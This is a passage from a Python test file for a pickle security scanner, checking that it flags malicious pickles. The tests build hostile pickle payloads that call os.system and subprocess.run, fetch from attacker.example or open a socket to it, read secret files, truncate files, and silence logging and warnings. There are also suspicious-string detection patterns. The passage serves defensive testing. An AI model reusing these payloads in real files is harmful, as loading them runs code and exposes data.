        size=len(payload),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    finding = next(finding for finding in report.findings if finding.rule_code == "STRUCTURAL_TAMPER")
    assert finding.details["tamper_type"] == "oversized_frame"
    assert finding.details["position"] == len(first_stream) + 2
    assert finding.details["stream_offset"] == len(first_stream)
    assert finding.details["frame_length"] == frame_length
    assert finding.details["remaining_bytes"] == 1
    assert finding.details["overrun_boundary"] == "stop"
    assert any(notice.code == "oversized_frame" for notice in report.notices)
    assert any(notice.code == "known_stream_truncated" for notice in report.notices)


def test_scan_stream_known_size_cap_preserves_frame_crossing_stop_tamper() -> None:
    payload = b"\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00}.\x80\x04N."

    report = PickleScanner(ScanOptions(max_known_stream_read_bytes=13)).scan_stream(
        io.BytesIO(payload),
        source="known-size-capped-frame-crossing-stop.pkl",
        size=len(payload),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    finding = next(
        finding
        for finding in report.findings
        if finding.rule_code == "STRUCTURAL_TAMPER" and finding.details.get("overrun_boundary") == "stop"
    )
    assert finding.details["tamper_type"] == "oversized_frame"
    assert finding.details["frame_length"] == 5
    assert finding.details["remaining_bytes"] == 2
    assert any(notice.code == "oversized_frame" for notice in report.notices)
    assert any(notice.code == "known_stream_truncated" for notice in report.notices)


def test_scan_stream_unknown_size_cap_does_not_report_unproven_oversized_frame_tamper() -> None:
    payload = b"\x80\x04\x95\x02\x00\x00\x00\x00\x00\x00\x00}."

    report = PickleScanner(ScanOptions(max_unbounded_stream_read_bytes=11)).scan_stream(
        io.BytesIO(payload),
        source="unknown-size-capped-frame.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert not any(notice.code == "oversized_frame" for notice in report.notices)
    assert any(notice.code == "unbounded_stream_truncated" for notice in report.notices)


def test_scan_stream_bounds_protocol_zero_readline_without_declared_size() -> None:
    stream = NoUnboundedReadlineStream(b"S'" + (b"a" * 64))

    report = PickleScanner(ScanOptions(max_unbounded_stream_read_bytes=8)).scan_stream(
        stream,
        source="unterminated-protocol-zero.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert not any(error.category == "io_error" for error in report.errors)
    assert any(notice.code == "unbounded_stream_truncated" for notice in report.notices)
    assert stream.unbounded_readline_attempted is False
    assert stream.max_seen_readline_size <= 8


def test_scan_options_rejects_invalid_unbounded_stream_read_limit() -> None:
    with pytest.raises(ValueError, match="max_unbounded_stream_read_bytes"):
        ScanOptions(max_unbounded_stream_read_bytes=0)


def test_scan_options_rejects_invalid_known_stream_read_limit() -> None:
    with pytest.raises(ValueError, match="max_known_stream_read_bytes"):
        ScanOptions(max_known_stream_read_bytes=0)


def test_scan_bytes_flags_malformed_stack_global_operands() -> None:
    payload = b"\x80\x04K\x01K\x02\x93."

    report = scan_bytes(payload, source="malformed-stack-global.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "MALFORMED_STACK_GLOBAL" for finding in report.findings)


def test_scan_bytes_reports_parse_errors_without_security_findings() -> None:
    report = scan_bytes(b"not a pickle", source="bad.bin")

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert len(report.errors) == 1
    assert report.errors[0].category == "parse_error"


def test_scan_bytes_reports_inconclusive_status_when_opcode_budget_is_reached() -> None:
    payload = pickle.dumps([1, 2, 3, 4, 5], protocol=4)
    report = scan_bytes(payload, source="budget.pkl", options=ScanOptions(max_opcodes=2))

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert any(notice.code == "opcode_budget" for notice in report.notices)


def test_scan_bytes_post_budget_tail_starts_at_budget_boundary() -> None:
    payload = b"\x80\x04cos\nsystem\n."

    report = scan_bytes(payload, source="budget-tail.pkl", options=ScanOptions(max_opcodes=1))

    assert report.status == ScanStatus.INCONCLUSIVE
    assert any(finding.rule_code == "POST_BUDGET_GLOBAL" for finding in report.findings)


def test_scan_bytes_post_budget_tail_records_oversized_frame_tamper() -> None:
    payload = b"\x80\x04N\x95\x03\x00\x00\x00\x00\x00\x00\x00}."

    report = scan_bytes(payload, source="budget-frame.pkl", options=ScanOptions(max_opcodes=2))

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    finding = next(finding for finding in report.findings if finding.rule_code == "STRUCTURAL_TAMPER")
    assert finding.details["tamper_type"] == "oversized_frame"
    assert finding.details["frame_length"] == 3
    assert finding.details["remaining_bytes"] == 2


def test_scan_bytes_post_budget_tail_handles_stack_global_at_boundary() -> None:
    payload = b"\x80\x04\x8c\x05posix\x94\x8c\x06system\x94\x93."

    report = scan_bytes(payload, source="budget-stack-global.pkl", options=ScanOptions(max_opcodes=5))

    assert report.status == ScanStatus.INCONCLUSIVE
    assert any(finding.rule_code == "POST_BUDGET_GLOBAL" for finding in report.findings)


def test_scan_bytes_post_budget_tail_detects_default_protocol_stack_global() -> None:
    payload = b"\x80\x04\x88\x88" + pickle.dumps(MaliciousPayload(), protocol=4)[2:]

    report = scan_bytes(
        payload,
        source="budget-default-protocol-stack-global.pkl",
        options=ScanOptions(max_opcodes=2, post_budget_scan_bytes=4096),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "POST_BUDGET_GLOBAL"
        and finding.severity == Severity.CRITICAL
        and f"{finding.details.get('module')}.{finding.details.get('name')}" in SYSTEM_GLOBALS
        for finding in report.findings
    )


def test_scan_bytes_post_budget_tail_resynchronizes_after_malformed_bytes() -> None:
    payload = b"\x80\x04\x88\x88\xff" + pickle.dumps(MaliciousPayload(), protocol=4)[2:]

    report = scan_bytes(
        payload,
        source="budget-malformed-default-protocol-stack-global.pkl",
        options=ScanOptions(max_opcodes=2, post_budget_scan_bytes=4096),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "POST_BUDGET_GLOBAL"
        and finding.severity == Severity.CRITICAL
        and f"{finding.details.get('module')}.{finding.details.get('name')}" in SYSTEM_GLOBALS
        for finding in report.findings
    )


def test_scan_bytes_post_budget_tail_does_not_resynchronize_inside_truncated_literals() -> None:
    inert_inner_bytes = b"\x8c\nsubprocess\x94\x8c\x03run\x94\x93)R."
    payload = (
        b"\x80\x04\x88\x88X"
        + (64).to_bytes(4, "little")
        + inert_inner_bytes
        + (b"A" * (64 - len(inert_inner_bytes)))
        + b"."
    )

    report = scan_bytes(
        payload,
        source="budget-truncated-literal.pkl",
        options=ScanOptions(max_opcodes=2, post_budget_scan_bytes=32),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert not any(
        finding.rule_code == "POST_BUDGET_GLOBAL"
        and finding.details.get("module") == "subprocess"
        and finding.details.get("name") == "run"
        for finding in report.findings
    )


@pytest.mark.parametrize(
    "payload_suffix",
    [
        b"S'sub\\x70rocess'\nS'run'\n\x93)R.",
        b"Vsub\\u0070rocess\nVrun\n\x93)R.",
    ],
    ids=["string-escape", "unicode-escape"],
)
def test_scan_bytes_post_budget_tail_detects_protocol0_stack_global(payload_suffix: bytes) -> None:
    payload = b"\x80\x04\x88\x88" + payload_suffix

    report = scan_bytes(
        payload,
        source="budget-protocol0-stack-global.pkl",
        options=ScanOptions(max_opcodes=2, post_budget_scan_bytes=4096),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "POST_BUDGET_GLOBAL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("module") == "subprocess"
        and finding.details.get("name") == "run"
        for finding in report.findings
    )


def test_scan_bytes_post_budget_tail_detects_prememoized_stack_global() -> None:
    payload = _make_pre_memoized_post_budget_stack_global_payload(b"h\x00h\x01\x93)R.")

    report = scan_bytes(
        payload,
        source="budget-prememo-stack-global.pkl",
        options=ScanOptions(max_opcodes=7, post_budget_scan_bytes=4096),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "POST_BUDGET_GLOBAL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("module") == "subprocess"
        and finding.details.get("name") == "run"
        for finding in report.findings
    )


@pytest.mark.parametrize(
    "tail",
    [
        b"h\x00" + _short_binunicode(b"run") + b"\x93)R.",
        _short_binunicode(b"subprocess") + b"h\x01\x93)R.",
        b"h\x00U\x03run\x93)R.",
        b"h\x00S'run'\n\x93)R.",
        b"S'subprocess'\nh\x01\x93)R.",
    ],
    ids=[
        "memo-module-inline-name",
        "inline-module-memo-name",
        "memo-module-short-binstring-name",
        "memo-module-protocol0-name",
        "protocol0-module-memo-name",
    ],
)
def test_scan_bytes_post_budget_tail_detects_mixed_prememoized_stack_global(tail: bytes) -> None:
    payload = _make_pre_memoized_post_budget_stack_global_payload(tail)

    report = scan_bytes(
        payload,
        source="budget-prememo-mixed-stack-global.pkl",
        options=ScanOptions(max_opcodes=7, post_budget_scan_bytes=4096),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "POST_BUDGET_GLOBAL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("module") == "subprocess"
        and finding.details.get("name") == "run"
        for finding in report.findings
    )


@pytest.mark.parametrize(
    "tail",
    [
        b"h\x00h\x0120\x93)R.",
        b"h\x00(0h\x01\x93)R.",
        b"h\x00N0h\x01\x93)R.",
    ],
    ids=["dup-pop", "mark-pop", "none-pop"],
)
def test_scan_bytes_post_budget_tail_detects_interleaved_prememoized_stack_global(tail: bytes) -> None:
    payload = _make_pre_memoized_post_budget_stack_global_payload(tail)

    report = scan_bytes(
        payload,
        source="budget-prememo-interleaved-stack-global.pkl",
        options=ScanOptions(max_opcodes=7, post_budget_scan_bytes=4096),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "POST_BUDGET_GLOBAL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("module") == "subprocess"
        and finding.details.get("name") == "run"
        for finding in report.findings
    )


@pytest.mark.parametrize(
    "tail",
    [
        _short_binunicode(b"subprocess") + b"q\x05" + _short_binunicode(b"run") + b"q\x06h\x05h\x06\x93)R.",
        _short_binunicode(b"subprocess") + b"p5\n" + _short_binunicode(b"run") + b"p6\ng5\ng6\n\x93)R.",
        _short_binunicode(b"subprocess") + b"\x94" + _short_binunicode(b"run") + b"\x94h\x00h\x01\x93)R.",
    ],
    ids=["binput-binget", "put-get", "memoize-binget"],
)
def test_scan_bytes_post_budget_tail_tracks_tail_local_memo_writes(tail: bytes) -> None:
    payload = b"\x80\x04\x88" + tail

    report = scan_bytes(
        payload,
        source="budget-tail-local-memo-stack-global.pkl",
        options=ScanOptions(max_opcodes=2, post_budget_scan_bytes=4096),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "POST_BUDGET_GLOBAL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("module") == "subprocess"
        and finding.details.get("name") == "run"
        for finding in report.findings
    )


def test_scan_bytes_handles_multiple_pickle_streams() -> None:
    payload = pickle.dumps({"a": 1}, protocol=4) + pickle.dumps(MaliciousPayload(), protocol=4)

    report = scan_bytes(payload, source="stacked.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert report.coverage.bytes_scanned == len(payload)


def test_scan_bytes_flags_suspicious_exec_string_literals() -> None:
    report = scan_bytes(
        pickle.dumps({"code": "exec('import os; os.system(\"ls\")')"}),
        source="string-payload.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(finding.rule_code == "SUSPICIOUS_STRING" and "exec(" in finding.message for finding in report.findings)


def test_scan_bytes_allows_common_dunder_metadata_literals() -> None:
    report = scan_bytes(
        pickle.dumps(
            {
                "__version__": "1.0.0",
                "__metadata__": {"format": "safe"},
                "__schema__": "model-card-v1",
                "__name__": "example-model",
                "__dict__": {"shape": "metadata"},
                "__slots__": ("weight", "bias"),
                "__module__": "example",
                "__qualname__": "Example",
                "__annotations__": {"weight": "Tensor"},
            }
        ),
        source="dunder-metadata.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)


def test_scan_bytes_allows_benign_security_documentation_strings() -> None:
    report = scan_bytes(
        pickle.dumps(
            {
                "doc": [
                    "Do not call os.system(command) from model loading code.",
                    "subprocess.run(args) is documented here as a blocked API.",
                    "An import statement loads a module.",
                    "importlib.import_module(name) is referenced in Python docs.",
                    "base64.b64decode(data) decodes text but is not executed here.",
                    r"The bytes are written as \x80 in the file format reference.",
                    "https://example.invalid/docs/os.system is a URL path, not code.",
                    "__reduce__ is a pickle protocol hook.",
                ]
            },
            protocol=4,
        ),
        source="security-docs.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


@pytest.mark.parametrize(
    "literal",
    [
        "https://example.invalid/docs/os.system(command)",
        "https://example.invalid/api/subprocess.run(args)",
        "https://example.invalid/reference/requests.get(url)",
        "https://example.invalid/reference/httpx.get(url)",
        "https://example.invalid/path?x=1&handler=requests.get(url)",
        "https://github.com/example/project/blob/main/loader.py",
    ],
)
def test_scan_bytes_allows_inert_url_literals_with_executable_terms(literal: str) -> None:
    report = scan_bytes(pickle.dumps({"metadata_url": literal}, protocol=4), source="url-metadata.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


@pytest.mark.parametrize(
    ("payload", "import_reference"),
    [
        (b"curllib.request\nurlopen\n(Vhttps://attacker.example/payload\ntR.", "urllib.request.urlopen"),
        (b"crequests\nget\n(Vhttps://attacker.example/payload\ntR.", "requests.get"),
        (b"chttpx\nget\n(Vhttps://attacker.example/payload\ntR.", "httpx.get"),
        (b"csocket\ncreate_connection\n(Vattacker.example\nI4444\ntR.", "socket.create_connection"),
        (b"csubprocess\nrun\n((Vcurl\nVhttps://attacker.example/payload\netR.", "subprocess.run"),
        (
            b"ctorch.hub\ndownload_url_to_file\n(Vhttps://attacker.example/payload\nV/tmp/model.bin\ntR.",
            "torch.hub.download_url_to_file",
        ),
    ],
)
def test_scan_bytes_keeps_network_url_reducers_actionable(payload: bytes, import_reference: str) -> None:
    report = scan_bytes(payload, source="network-reducer.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == import_reference
        for finding in report.findings
    )


@pytest.mark.parametrize("literal", ["__a__", "__x_y__"])
def test_scan_bytes_allows_user_defined_dunder_metadata_literals(literal: str) -> None:
    report = scan_bytes(pickle.dumps({"metadata": literal}, protocol=4), source="user-dunder.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


@pytest.mark.parametrize(
    ("literal", "expected_pattern"),
    [
        ("os.popen('id')", "os.popen"),
        ("subprocess.run(['id'])", "subprocess call"),
        ("getattr(os, 'system')('id')", "getattr system"),
        ("base64.b64decode(blob)", "base64.b64decode"),
        ("joblib.load(path)", "pickle loader call"),
        ("cloudpickle.loads(blob)", "pickle loader call"),
        ("copyreg.add_extension(module, name, code)", "copyreg extension"),
    ],
)
def test_scan_bytes_flags_expanded_suspicious_string_patterns(literal: str, expected_pattern: str) -> None:
    report = scan_bytes(pickle.dumps({"code": literal}), source="string-pattern.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == expected_pattern
        for finding in report.findings
    )


@pytest.mark.parametrize(
    ("literal", "pattern"),
    [
        (b"os.system('id')", "base64 os.system"),
        (b"eval(x)", "base64 eval("),
    ],
)
def test_scan_bytes_flags_base64_encoded_code_string_literals(literal: bytes, pattern: str) -> None:
    encoded = base64.b64encode(literal).decode("ascii")

    report = scan_bytes(pickle.dumps({"code": encoded}), source="encoded-code-string.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == pattern
        for finding in report.findings
    )


def test_scan_bytes_can_decode_stack_global_from_memoized_operands() -> None:
    payload = b"\x80\x04\x8c\x05posix\x94\x8c\x06system\x94h\x00h\x01\x93."

    report = scan_bytes(payload, source="stack-global.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any("posix.system" in finding.message for finding in report.findings)


@pytest.mark.parametrize(
    "name",
    ["eval.__doc__", "eval.__name__", "eval.__module__", "eval.__qualname__"],
)
def test_scan_bytes_keeps_stack_global_metadata_attributes_clean(name: str) -> None:
    payload = b"\x80\x04" + _short_binunicode(b"builtins") + _short_binunicode(name.encode()) + b"\x93."

    report = scan_bytes(payload, source=f"{name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


def test_scan_bytes_warns_on_functools_partial_without_marking_benign_partial_malicious() -> None:
    payload = pickle.dumps(functools.partial(int, base=10), protocol=4)

    report = scan_bytes(payload, source="partial.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code in {"DANGEROUS_CALL", "DANGEROUS_GLOBAL"}
        and finding.severity.value == "warning"
        and finding.details.get("import_reference") == "functools.partial"
        for finding in report.findings
    )
    assert not any(finding.severity.value == "critical" for finding in report.findings)


def test_scan_bytes_detects_pathlib_mutating_dotted_method_reduce(tmp_path: Path) -> None:
    target = tmp_path / "pickle_touch_bypass_marker"
    expected_reference = f"pathlib.{_concrete_pathlib_class_name()}.touch"
    payload = _pathlib_method_reduce_payload(target, "touch")

    report = scan_bytes(payload, source="pathlib-touch.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert target.exists() is False
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == expected_reference
        for finding in report.findings
    )
    assert any(
        ref["import_reference"] == expected_reference and ref["is_dangerous"] is False
        for ref in report.metadata["import_references"]
    )
    pickle.loads(payload)
    assert target.exists() is True


def test_scan_bytes_detects_pathlib_read_text_dotted_method_reduce(tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("modelaudit-secret-8\n", encoding="utf-8")
    expected_reference = f"pathlib.{_concrete_pathlib_class_name()}.read_text"
    payload = _pathlib_method_reduce_payload(secret, "read_text")

    report = scan_bytes(payload, source="pathlib-read-text.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == expected_reference
        for finding in report.findings
    )
    assert pickle.loads(payload) == "modelaudit-secret-8\n"


def test_scan_bytes_detects_pathlib_read_bytes_dotted_method_reduce(tmp_path: Path) -> None:
    secret = tmp_path / "secret.bin"
    secret.write_bytes(b"\x00modelaudit-secret-8\xff")
    expected_reference = f"pathlib.{_concrete_pathlib_class_name()}.read_bytes"
    payload = _pathlib_method_reduce_payload(secret, "read_bytes")

    report = scan_bytes(payload, source="pathlib-read-bytes.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == expected_reference
        for finding in report.findings
    )
    assert pickle.loads(payload) == b"\x00modelaudit-secret-8\xff"


@pytest.mark.parametrize(
    "expected_reference",
    [
        "pathlib._local.PosixPath.iterdir",
        "pathlib._local.PosixPath.read_text",
    ],
)
def test_scan_bytes_detects_python313_pathlib_local_dotted_method_reduce(expected_reference: str) -> None:
    method_name = expected_reference.removeprefix("pathlib._local.")
    payload = b"\x80\x04cpathlib._local\n" + method_name.encode("ascii") + b"\n)R."

    report = scan_bytes(payload, source=f"{expected_reference}-local-method.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == expected_reference
        for finding in report.findings
    )


def test_scan_bytes_allows_benign_pathlib_path_constructor() -> None:
    class_name = _concrete_pathlib_class_name()
    payload = b"\x80\x04" + f"cpathlib\n{class_name}\n".encode("ascii") + _binunicode(b"model.bin") + b"\x85R."

    report = scan_bytes(payload, source="pathlib-constructor.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


def test_scan_bytes_allows_python313_pathlib_local_pure_path_constructor() -> None:
    payload = b"\x80\x04cpathlib._local\nPurePosixPath\n" + _binunicode(b"model.bin") + b"\x85R."

    report = scan_bytes(payload, source="python313-pathlib-local-constructor.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


@pytest.mark.parametrize(
    ("module", "name", "expected_reference"),
    [
        (b"io", b"open", "io.open"),
        (b"logging", b"FileHandler", "logging.FileHandler"),
    ],
)
def test_scan_bytes_detects_file_truncating_stdlib_reduce(
    tmp_path: Path,
    module: bytes,
    name: bytes,
    expected_reference: str,
) -> None:
    target = tmp_path / f"{module.decode()}-{name.decode()}-should-not-truncate.txt"
    target.write_text("keep this content\n", encoding="utf-8")
    payload = _file_mode_reduce_payload(module, name, target, b"w")

    report = scan_bytes(payload, source=f"{expected_reference}-truncate.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert target.stat().st_size > 0
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == expected_reference
        for finding in report.findings
    )
    result = pickle.loads(payload)
    try:
        assert target.stat().st_size == 0
    finally:
        result.close()


@pytest.mark.parametrize(
    ("module", "mode", "expected_reference", "close_may_fail"),
    [
        ("codecs", b"w", "codecs.open", False),
        ("gzip", b"wb", "gzip.open", False),
        ("bz2", b"wb", "bz2.open", False),
        ("lzma", b"wb", "lzma.open", False),
        ("wave", b"wb", "wave.open", True),
        ("aifc", b"wb", "aifc.open", True),
        ("sunau", b"wb", "sunau.open", True),
    ],
)
def test_scan_bytes_detects_stdlib_file_opening_wrappers(
    tmp_path: Path,
    module: str,
    mode: bytes,
    expected_reference: str,
    close_may_fail: bool,
) -> None:
    pytest.importorskip(module)
    target = tmp_path / f"{expected_reference.replace('.', '-')}-should-not-truncate.dat"
    original = b"keep this content\n" * 2
    target.write_bytes(original)
    payload = _file_mode_reduce_payload(module.encode("ascii"), b"open", target, mode)

    report = scan_bytes(payload, source=f"{expected_reference}-truncate.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert target.read_bytes() == original
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == expected_reference
        for finding in report.findings
    )
    result = pickle.loads(payload)
    close = getattr(result, "close", None)
    if close is not None:
        try:
            close()
        except Exception:
            if not close_may_fail:
                raise
    assert target.read_bytes() != original


def test_scan_bytes_detects_logging_disable_diagnostic_suppression() -> None:
    payload = b"\x80\x04clogging\ndisable\nK2\x85R."
    previous_disable = logging.root.manager.disable

    try:
        logging.disable(logging.NOTSET)
        report = scan_bytes(payload, source="logging-disable.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert logging.root.manager.disable == logging.NOTSET
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "logging.disable"
            for finding in report.findings
        )
        assert pickle.loads(payload) is None
        assert logging.root.manager.disable == logging.CRITICAL
    finally:
        logging.disable(previous_disable)


def test_scan_bytes_detects_logging_capture_warnings_diagnostic_reroute() -> None:
    payload = b"\x80\x04clogging\ncaptureWarnings\n\x88\x85R."
    original_showwarning = warnings.showwarning

    try:
        logging.captureWarnings(False)
        baseline_showwarning = warnings.showwarning
        report = scan_bytes(payload, source="logging-capture-warnings.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert warnings.showwarning is baseline_showwarning
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "logging.captureWarnings"
            for finding in report.findings
        )
        assert pickle.loads(payload) is None
        assert warnings.showwarning is not baseline_showwarning
    finally:
        logging.captureWarnings(False)
        warnings.showwarning = original_showwarning


@pytest.mark.parametrize(
    ("payload", "expected_reference"),
    [
        (
            b"\x80\x04cwarnings\nsimplefilter\n" + _short_binunicode(b"ignore") + b"\x85R.",
            "warnings.simplefilter",
        ),
        (
            b"\x80\x04cwarnings\nfilterwarnings\n" + _short_binunicode(b"ignore") + b"\x85R.",
            "warnings.filterwarnings",
        ),
    ],
)
def test_scan_bytes_detects_warnings_filter_suppression(payload: bytes, expected_reference: str) -> None:
    warnings.resetwarnings()
    report = scan_bytes(payload, source=f"{expected_reference}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert warnings.filters == []
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == expected_reference
        for finding in report.findings
    )
    assert pickle.loads(payload) is None
    assert warnings.filters[0][0] == "ignore"


def test_scan_bytes_detects_warnings_resetwarnings_policy_erasure() -> None:
    payload = b"\x80\x04cwarnings\nresetwarnings\n)R."
    original_filters = list(warnings.filters)

    try:
        warnings.resetwarnings()
        warnings.simplefilter("error")
        report = scan_bytes(payload, source="warnings-resetwarnings.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert warnings.filters[0][0] == "error"
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "warnings.resetwarnings"
            for finding in report.findings
        )
        assert pickle.loads(payload) is None
        assert warnings.filters == []
    finally:
        mutable_filters = cast(list[object], warnings.filters)
        mutable_filters[:] = original_filters


def test_scan_bytes_detects_warnings_filters_list_clear_policy_erasure() -> None:
    payload = _warnings_filters_list_clear_payload()
    original_filters = list(warnings.filters)

    try:
        warnings.resetwarnings()
        warnings.simplefilter("error")
        report = scan_bytes(payload, source="warnings-filters-list-clear.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert warnings.filters[0][0] == "error"
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "builtins.list.clear"
            for finding in report.findings
        )
        assert pickle.loads(payload) is None
        assert warnings.filters == []
    finally:
        mutable_filters = cast(list[object], warnings.filters)
        mutable_filters[:] = original_filters


def test_scan_bytes_detects_warnings_filters_operator_imul_policy_erasure() -> None:
    payload = _warnings_filters_operator_imul_payload()
    original_filters = list(warnings.filters)

    try:
        warnings.resetwarnings()
        warnings.simplefilter("error")
        report = scan_bytes(payload, source="warnings-filters-operator-imul.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert warnings.filters[0][0] == "error"
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "operator.imul"
            and finding.details.get("mutation_target") == "warnings.filters"
            for finding in report.findings
        )
        assert pickle.loads(payload) == []
        assert warnings.filters == []
    finally:
        mutable_filters = cast(list[object], warnings.filters)
        mutable_filters[:] = original_filters


def test_scan_bytes_detects_warnings_filters_list_insert_suppression() -> None:
    payload = _warnings_filters_list_insert_ignore_payload()
    original_filters = list(warnings.filters)

    try:
        warnings.resetwarnings()
        warnings.simplefilter("error")
        with pytest.raises(UserWarning):
            warnings.warn("before-pickle", UserWarning, stacklevel=2)
        report = scan_bytes(payload, source="warnings-filters-list-insert.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert warnings.filters[0][0] == "error"
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "builtins.list.insert"
            for finding in report.findings
        )
        assert pickle.loads(payload) is None
        warnings.warn("after-pickle", UserWarning, stacklevel=2)
        assert warnings.filters[0][0] == "ignore"
    finally:
        mutable_filters = cast(list[object], warnings.filters)
        mutable_filters[:] = original_filters


def test_scan_bytes_detects_logging_root_handlers_list_clear() -> None:
    payload = _logging_root_handlers_list_clear_payload()
